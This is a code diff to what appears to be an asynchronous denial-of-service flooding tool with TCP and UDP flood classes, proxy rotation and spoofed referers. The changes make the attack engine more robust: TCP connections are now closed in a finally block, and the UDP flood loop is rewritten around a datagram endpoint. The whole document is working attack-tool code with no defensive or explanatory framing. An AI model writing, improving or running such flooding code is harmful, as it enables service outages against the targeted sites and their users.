@@ -20,7 +20,7 @@ from yarl import URL
 
 from . import proxy_proto
 from .core import logger
-from .proto import FloodIO, FloodOp, FloodSpec, FloodSpecType
+from .proto import DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType
 from .proxies import NoProxySet, ProxySet
 from .targets import TargetStats
 from .vendor.referers import REFERERS
@@ -301,6 +301,7 @@ class AsyncTcpFlood:
             )
             conn = self._loop.create_connection(
                 flood_proto, host=proxy.proxy_host, port=proxy.proxy_port)
+        transport = None
         try:
             async with async_timeout.timeout(self._settings.connect_timeout_seconds):
                 transport, _ = await conn
@@ -318,6 +319,9 @@ class AsyncTcpFlood:
             raise e
         else:
             return bool(await on_close)
+        finally:
+            if transport:
+                transport.close()
 
     async def GET(self, on_connect=None) -> bool:
         payload: bytes = self.build_request()
@@ -619,23 +623,18 @@ class AsyncUdpFlood:
         return await self.SENT_FLOOD()
 
     async def _generic_flood(self, packet_gen: Callable[[], Tuple[bytes, int]]) -> bool:
-        packets_sent = 0
-        with socket(AF_INET, SOCK_DGRAM) as sock:
-            async with async_timeout.timeout(self._settings.connect_timeout_seconds):
-                await self._loop.sock_connect(sock, self._target)
-            while True:
-                packet, packet_size = packet_gen()
-                try:
-                    async with async_timeout.timeout(self._settings.drain_timeout_seconds):
-                        await self._loop.sock_sendall(sock, packet)
-                except OSError as exc:
-                    if exc.errno == errno.ENOBUFS:
-                        await asyncio.sleep(0.5)
-                    else:
-                        raise exc
-                self._stats.track(1, packet_size)
-                packets_sent += 1
-        return packets_sent > 0
+        on_close = self._loop.create_future()
+        transport = None
+        async with async_timeout.timeout(self._settings.connect_timeout_seconds):
+            transport, _ = await self._loop.create_datagram_endpoint(
+                partial(DatagramFloodIO, self._loop, self._stats, packet_gen, on_close),
+                remote_addr=self._target
+            )
+        try:
+            return bool(await on_close)
+        finally:
+            if transport:
+                transport.close()
 
     async def UDP(self) -> bool:
         packet_size = 1024
